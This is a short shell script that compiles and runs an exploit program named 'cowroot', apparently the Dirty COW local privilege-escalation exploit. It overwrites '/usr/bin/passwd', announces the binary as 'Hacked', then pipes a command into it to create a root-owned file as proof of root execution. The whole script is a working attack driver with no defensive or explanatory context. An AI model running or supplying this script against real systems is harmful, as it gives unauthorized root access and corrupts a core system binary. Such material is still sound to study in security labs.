#!/bin/sh

gcc cowroot.c -o cowroot -pthread
echo "========================================"
echo "         Compile Complete."
echo "========================================"

./cowroot
echo "========================================"
echo "       Hacked '/usr/bin/passwd'"
echo "========================================"

echo "touch /success" | /usr/bin/passwd
echo "========================================"
echo "          Created /success"
echo "========================================"

echo "ls -l /success"
ls -l /success